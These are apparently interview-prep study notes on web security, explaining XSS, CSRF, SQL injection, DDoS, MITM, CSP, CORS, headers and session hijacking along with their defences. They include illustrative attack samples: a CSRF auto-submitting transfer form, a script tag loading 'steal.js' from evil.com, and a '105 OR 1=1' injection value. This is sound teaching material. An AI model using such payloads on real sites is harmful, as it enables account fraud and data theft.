# Web Security — Very Simple Notes

## The basic idea

An attacker usually looks for places where the application trusts something it should not trust.

The untrusted data may come from:

- A form
- A URL
- An API request
- A file upload
- A database record
- Another website

The most important rule is:

> Never trust user input. Validate permissions and data on the server.

## Quick revision

| Attack | What the attacker tries | Main solution |
|---|---|---|
| XSS | Put malicious JavaScript into your page | Display input safely and use CSP |
| CSRF | Make a logged-in browser send an unwanted request | SameSite cookie and CSRF token |
| SQL injection | Put SQL commands into user input | Parameterized queries |
| DDoS | Overload the service with traffic | CDN, WAF, rate limits, and scaling |
| MITM | Secretly read or change network traffic | HTTPS, TLS, and HSTS |

## 1. Cross-Site Scripting (XSS)

An XSS (Cross-Site Scripting) attack occurs when an application takes untrusted data from a user and displays it on a webpage without checking or cleaning it first, allowing malicious JavaScript to execute inside a victim's browser

### How do we stop it?

- Display user input as plain text, not as HTML.
- Avoid rendering raw HTML from users.
- If HTML must be allowed, clean it with a trusted HTML sanitizer.
- Use Content Security Policy as an extra safety layer.
- Store session IDs in `HttpOnly` cookies so JavaScript cannot read them.

## 2. Cross-Site Request Forgery (CSRF)

### What is it?

CSRF means an attacker tricks your browser into performing an unwanted action on a website where you are already logged in.

### Example

Suppose you are logged in to `bank.com`. Your browser has a login cookie belonging to `bank.com`.

You then visit `evil.com`. The attacker's page contains a hidden form whose destination is the bank:

```html
<form id="transfer" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
</form>

<script>
  document.querySelector("#transfer").submit()
</script>
```

The attacker's website does not send the request through its own server. It instructs **your browser** to submit the form directly to `bank.com`.

```text
You open evil.com
        ↓
evil.com tells your browser to submit the hidden form
        ↓
Your browser sends the request directly to bank.com
        ↓
Because the destination is bank.com,
your browser may include the bank.com login cookie
        ↓
The bank sees a valid cookie and may process the transfer
```

The actual network flow is:

```text
evil.com gives an instruction to your browser
your browser ──────────→ bank.com
```

The attacker usually cannot read the bank's response because of the browser's same-origin and CORS rules. However, the request may still be sent and the transfer may already have happened.

### How do we stop it?

- Use `SameSite` cookies.
- Require a CSRF token for requests that change data.
- Check the request's origin on the server.

### Simple interview answer

> CSRF tricks a logged-in browser into sending an unwanted request with its cookie. We prevent it using SameSite cookies, CSRF tokens, and origin checks.

## XSS versus CSRF

| XSS | CSRF |
|---|---|
| Attacker's script runs inside your website | Another website sends an unwanted request to your website |
| Attacker abuses unsafe page content | Attacker abuses automatically sent cookies |
| Main solution: safe output | Main solution: SameSite and CSRF token |

## 3. SQL injection

### What is it?

SQL injection means:

> The application expects normal user data, but the attacker enters SQL instructions instead. Because the application builds the query unsafely, the database runs those instructions.

example: 
    UserId:  105 OR 1=1

Then, the SQL statement will look like this:

SELECT * FROM Users WHERE UserId = 105 OR 1=1;

## 4. Distributed Denial of Service (DDoS)

### What is it?

A DDoS attack tries to make a website unavailable by sending more traffic than it can handle.

It is called **distributed** because the traffic comes from many devices, not just one computer.


### How do we stop it?

Large DDoS attacks cannot always be completely stopped by the application. We reduce their effect using several layers:

- Use a CDN and DDoS-protection provider.
- Use a Web Application Firewall to block suspicious traffic.
- Add rate limits so one client cannot make unlimited requests.
- Use load balancing and automatic scaling.

Rate limiting is helpful but is not enough by itself for a very large attack.


## 5. Man-in-the-Middle (MITM) attack

### What is it?

A MITM attack happens when an attacker secretly stands between the user and the server.

The user thinks they are communicating directly with the website, but the attacker tries to read or change the traffic.

### How does the attacker try it?

For example, a user connects through an unsafe public Wi-Fi network. If the website uses an unencrypted connection, someone controlling the network may try to read passwords or change the returned page.

```text
User ←→ Attacker controlling network ←→ Server
```

### How do we stop it?

- Use HTTPS everywhere.
- Use valid TLS certificates.
- Never ignore certificate warnings.
- Redirect HTTP requests to HTTPS.
- Mark sensitive cookies as `Secure`.
- Keep TLS software and configuration updated.

HTTPS encrypts the data, checks that it was not modified, and helps confirm the server's identity.

### Simple interview answer

> In a MITM attack, someone intercepts communication between the user and server. We prevent it with correctly configured HTTPS/TLS, certificate validation, HSTS, and Secure cookies.

## 6. Content Security Policy (CSP)

### What is it?

CSP stands for **Content Security Policy**.

It is a security rule sent by the server to the browser. It tells the browser where scripts, styles, images, and other files are allowed to come from.

Think of it as a guest list:

```text
Resource is on the trusted list     → browser allows it
Resource is not on the trusted list → browser blocks it
```

### Example

Suppose `shop.com` has a comments page with an XSS mistake. An attacker manages to place this content inside a comment:

```html
<script src="https://evil.com/steal.js"></script>
```

Without CSP, the browser may download and execute `steal.js` as part of `shop.com`.

The `shop.com` server sends this CSP header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

`'self'` means the current website—`shop.com` in this example. Therefore:

```text
Script from shop.com → allowed
Script from evil.com → blocked
```

The flow is:

```text
Attacker's script appears in the HTML
                 ↓
Browser reads the CSP sent by shop.com
                 ↓
Browser sees that evil.com is not allowed
                 ↓
Browser refuses to load the script
```

The malicious HTML may still exist on the page, but CSP prevents that untrusted script from running.

### How do we use it safely?

- Send CSP as an HTTP response header from the server.
- Allow only the sources the application actually needs.
- Avoid broad rules that allow scripts from everywhere.
- Avoid allowing unsafe inline scripts when possible.
- Test the policy before enforcing it so valid application files are not accidentally blocked.

### Important point

CSP is an **extra layer of protection** against XSS. The main fix is still to safely display user input and sanitize HTML when HTML is genuinely required.

```text
Safe rendering prevents malicious HTML from entering the page.
CSP helps block a malicious script if it still reaches the page.
```

### Simple interview answer

> CSP is a server-sent allowlist that tells the browser which resources may load or run. If an attacker injects a script from an untrusted website, the browser blocks it.

## 7. CORS

### What is it?

CORS controls which websites are allowed to read responses from your API in a browser.

For example:

```text
frontend.com → api.company.com
```

These are different origins. The API must tell the browser whether `frontend.com` is allowed to read its response.


### How do we configure it safely?

- Allow only trusted frontend origins.
- Do not accept any origin without checking it.
- Allow only the methods and headers the frontend needs.
- Be especially careful when allowing cookies.
- Continue checking authentication and permissions on the server.

### Simple interview answer

> CORS lets the server choose which websites may read its responses in a browser. We use a small trusted-origin list and still enforce authentication and authorization on the server.


Important cookie settings are:

- `HttpOnly`: JavaScript cannot read the cookie.
- `Secure`: the cookie is sent only over HTTPS.
- `SameSite`: controls when a cookie is sent from another website.

### How do we use them safely?

- Set them centrally on the server or gateway.
- Start with secure defaults.
- Allow only features and sources the application needs.
- Test the website after enabling them.
- Check the deployed website using browser tools or a security-header scanner.

Headers are extra protection. They cannot fix insecure application logic.

## Final interview revision

```text
XSS
Attack: attacker puts JavaScript into our page
Fix:    safe output, sanitization, CSP

CSRF
Attack: another site sends a request with the user's cookie
Fix:    SameSite cookie, CSRF token, origin check

SQL injection
Attack: input changes the database command
Fix:    parameterized query

DDoS
Attack: many devices overload the service
Fix:    rate limits, scaling

MITM
Attack: someone intercepts network traffic
Fix:    HTTPS/TLS, certificates, HSTS

CSP
Purpose: controls what the browser is allowed to load

CORS
Purpose: controls which websites can read API responses
```

## 8. Security headers

### What are they?

Security headers are safety instructions sent by the server with its response.

The browser reads these instructions before displaying the page. They tell the browser things such as:

```text
Always use HTTPS.
Do not run scripts from unknown websites.
Do not allow another website to place this page inside an iframe.
```

They provide extra protection, but they do not fix insecure application code.

| Header | What it tells the browser |
|---|---|
| `Content-Security-Policy` | Load scripts and other files only from trusted places |
| `Permissions-Policy` | Allow or block features such as camera, microphone, and location |


| `Strict-Transport-Security` | Always open this website using HTTPS |
| `X-Content-Type-Options` | Trust the file type provided by the server; do not guess another type |
| `Referrer-Policy` | Limit how much of the current page's URL is shared with another website |

### Simple example

Suppose a server sends a `Permissions-Policy` that disables the camera.

Even if some JavaScript tries to access the camera, the browser blocks it because the server said that this page does not need camera access.

### Important cookie settings

These are cookie settings rather than separate security headers, but they are commonly discussed with them:

- `HttpOnly`: JavaScript cannot read the cookie.
- `Secure`: send the cookie only through HTTPS.
- `SameSite`: limit when the cookie is sent from another website.

### Interview answer

> Security headers are instructions from the server that enable browser protections. They can enforce HTTPS, restrict scripts, limit browser permissions, and prevent the page from being placed inside an untrusted iframe.

## 9. What if someone copies my login token?

A valid copied token may allow another person to use the account without knowing the password. This is called **session hijacking**.

```text
User and attacker both have token A
                 ↓
Server may treat both as the logged-in user
```

### How do we protect the session?

- Store tokens in `HttpOnly`, `Secure`, and `SameSite` cookies.
- Use HTTPS and prevent XSS.
- Keep access tokens and sessions short-lived.
- Allow users to view sessions and log out from all devices.
- Revoke sessions on the server after logout, password reset, or suspicious activity.
- Ask for a password, OTP, or passkey before sensitive actions.
- Detect unusual devices, locations, and behavior, then notify the user or require login again.

### What about refresh tokens?

Merely refreshing a token is not enough because an attacker with the refresh token may also get a new access token.

Use **one-time refresh-token rotation**:

```text
Token A is used → invalidate A and issue B
Token A is used again → theft detected
                       → revoke the complete session
```

If the attacker uses token A first, the real user's later attempt to use A reveals that two people have the token. The server then revokes the whole session and requires login again.

### Important limitation

If the attacker is the only person using the stolen token, reuse detection may not trigger immediately. Therefore, also use short expiry, unusual-activity detection, notifications, and re-authentication for sensitive operations.

> **Interview answer:** A copied valid token can cause session hijacking. Protect it with secure cookies, HTTPS, short lifetimes, refresh-token rotation with reuse detection, server-side revocation, risk detection, and step-up authentication.
